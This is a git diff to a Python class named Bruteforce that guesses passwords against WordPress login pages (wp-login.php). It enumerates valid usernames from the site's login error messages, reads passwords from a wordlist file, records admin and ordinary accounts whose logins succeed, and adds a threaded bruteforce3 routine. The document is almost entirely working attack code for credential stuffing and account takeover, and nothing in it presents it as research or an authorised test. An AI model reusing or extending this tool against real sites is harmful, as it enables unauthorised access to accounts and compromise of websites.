@@ -15,14 +15,14 @@ class Bruteforce:
         self.__logins = scanner.logins
         self.__admin = scanner.admin
         self.__stop = False  # Add a stop flag
-        keyboard.on_press_key("q", self.stop)  # Stop on 'q' key press
+        self.next = False
 
     def stop(self, e=None):  # Add a method to set the stop flag
         self.__stop = True
 
     def set_passwords(self, filepath="src/db/passwords.txt"):
         with open(filepath, "r") as file:
-            passwords = file.read().split()
+            passwords = file.read().splitlines()
         return passwords
 
     @property
@@ -54,6 +54,8 @@ class Bruteforce:
         return url
 
     def __sign_in(self, session, username, password):
+        keyboard.on_press_key("q", self.stop)  # Stop on 'q' key press
+
         slug: str = "wp-login.php"
         login_data = {
             "log": username,
@@ -82,6 +84,12 @@ class Bruteforce:
                 == f"Error: The password you entered for the username {username} is incorrect. Lost your password?"
             ):
                 self.__usernames.add(username)
+            elif (
+                error_msg
+                == f"Error: The username {username} is not registered on this site. If you are unsure of your username, try your email address instead."
+            ):
+                self.next = True
+
             print(f"Login failed with message: {error_msg}")
             session.close()
             return False
@@ -91,25 +99,16 @@ class Bruteforce:
             print(f"Successful login with {username}:{password} (admin)")
             self.__admin[username] = password
             session.close()
-            return False
+            return "success"
         else:
             print(f"Successful login with {username}:{password} (not admin)")
             self.__logins[username] = password
             session.close()
-            return False
-
-    def detect_admin(self):
-        with requests.Session() as s:
-            for user in self.users:
-                if self.__sign_in(s, user, "12345"):
-                    print(f"Admin user found: {user}")
-                    return True
+            return "success"
 
     def try_to_sign_in(self, username, password):
         with requests.Session() as s:
             self.__sign_in(s, username, password)
-
-    # TODO: bruteforce only for admin search; at least one user must be found; detect users by erros without bf passwords
 
     def bruteforce(self, usernames=False, passwords=False, max_workers=10):
         if not usernames:
@@ -135,3 +134,39 @@ class Bruteforce:
                         )
                         if not any(task.result() for task in tasks):
                             tasks.append(task)
+                        if task.result() == "success":
+                            break
+
+    def bruteforce3(self, usernames=False, passwords=False, max_workers=10):
+        if not usernames:
+            usernames = self.users
+        if not passwords:
+            passwords = self.passwords
+        self.__stop = False  # Reset the stop flag
+        print("Press 'q' to stop the bruteforce.")
+        keyboard.on_press_key("q", lambda _: setattr(self, "__stop", True))
+
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            tasks = []  # Move the tasks list outside the usernames loop
+            for username in usernames:
+                if self.__stop:  # Check the stop flag
+                    print("Bruteforce stopped.")
+                    break
+                for password in passwords:
+                    if self.__stop:  # Check the stop flag
+                        break
+                    if self.next:
+                        self.next = False
+                        break
+                    with requests.Session() as session:  # Create a new session for each username
+                        task = executor.submit(
+                            self.__sign_in, session, username, password
+                        )
+                        tasks.append(
+                            task
+                        )  # Add the task to the tasks list without waiting for it to complete
+
+        # After all tasks have been submitted, wait for their results
+        for task in tasks:
+            if task.result() is False:
+                print("Task failed.")
